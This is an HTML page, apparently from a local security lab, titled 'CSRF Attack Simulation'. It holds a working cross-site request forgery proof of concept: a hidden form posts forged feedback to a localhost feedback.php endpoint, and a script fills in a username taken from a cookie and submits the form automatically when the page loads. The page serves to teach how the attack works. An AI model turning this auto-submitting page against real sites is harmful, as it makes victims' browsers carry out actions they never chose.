<!-- http://localhost/codtech/csrf-cors/csrf-attack.html 
since cookies are saved on localhost, we cant find the cookies from the "open with live server" thing 

-->


<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<style>
button{
    background-color: #4682b4;
    border: 1px solid #4682b4;
    border-radius: 0 4px 4px 0;
    padding: 10px;
    cursor: pointer;
    color: #fff;
    font-size: 16px;
}
    
h1 {
    color: #4682b4;
    }
    </style>
<body>
    <h1>CSRF Attack Simulation</h1>

    <!-- hidden form field to send the request: vuln -->
    <form id="csrf-form" action="http://localhost/codtech/csrf/feedback.php" method="post">
        <input type="hidden" id="username" name="username" value="" />
        <input type="hidden" name="feedback" value="This was a CSRF attack." />
        <button type="submit">Submit Feedback</button>
    </form>

    <script>
        // function to get a specific cookie by name
        function getCookie(name) {
            let value = "; " + document.cookie;
            let parts = value.split("; " + name + "=");
            if (parts.length === 2) return parts.pop().split(";").shift();
            return null;
        }

        // check if 'username' cookie exists if yes extract it
        
        let username = getCookie('username');
        if (username) {
            // if cookie is present, use it
            document.getElementById('username').value = username;
            // alert(document.cookie);
            // automatically submit the form
            document.getElementById('csrf-form').submit();
        } else {
            // if no cookie is found, prompt the user to manually enter their username: not a real life scenario. its there for demo purpose.
            let manualUsername = prompt("Please enter the victim's username:");
            if (manualUsername) {
                document.getElementById('username').value = manualUsername;
                // automatically submit the form
                document.getElementById('csrf-form').submit();
            } else {
                alert("Username is required for CSRF attack.");
            }
        }
    </script>
</body>
</html>
